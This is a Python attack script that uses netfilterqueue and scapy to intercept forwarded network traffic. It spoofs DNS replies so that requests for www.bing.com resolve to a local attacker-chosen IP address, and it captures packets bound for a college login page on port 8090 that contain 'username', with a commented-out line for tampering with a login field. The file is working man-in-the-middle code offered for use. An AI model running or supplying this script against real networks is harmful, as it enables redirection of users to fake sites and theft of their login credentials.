#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num [queue num]

import netfilterqueue as net
import scapy.all as scapy
import re

def process_college_packet(packet):
    # print(packet.show())
    # load = str(packet[scapy.Raw].load)
    print(packet.show())
    # load = load.replace("nmode=191", "nmode=193")

    # packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    return packet
def process_packet(packet):
    # Converting packet into scapy packet
    scapy_packet = scapy.IP(packet.get_payload())

    # For college login page spoofing
    if scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 8090:
            if scapy_packet.haslayer(scapy.Raw):
                load = scapy_packet[scapy.Raw].load
                if "username" in str(load):
                    new_packet = process_college_packet(scapy_packet)
                    packet.set_payload(bytes(new_packet))

    # DNS response spoofing
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in str(qname):
            print(f"[+] Spoofing {qname}")
            # print(scapy_packet.show())
            ans = scapy.DNSRR(rrname=qname, rdata="192.168.146.129") # rdata is the website which we want the user to visit
            scapy_packet[scapy.DNS].an = ans
            scapy_packet[scapy.DNS].ancount = 1
            # print(scapy_packet.show())
            # Deleting the fields
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Setting the payload of the packet to the scapy packet
            packet.set_payload(bytes(scapy_packet)) # Since by default the payload data is in string format

    packet.accept() # Accepts all packets

queue = net.NetfilterQueue()
queue.bind(0, process_packet) # queue number and callback
queue.run()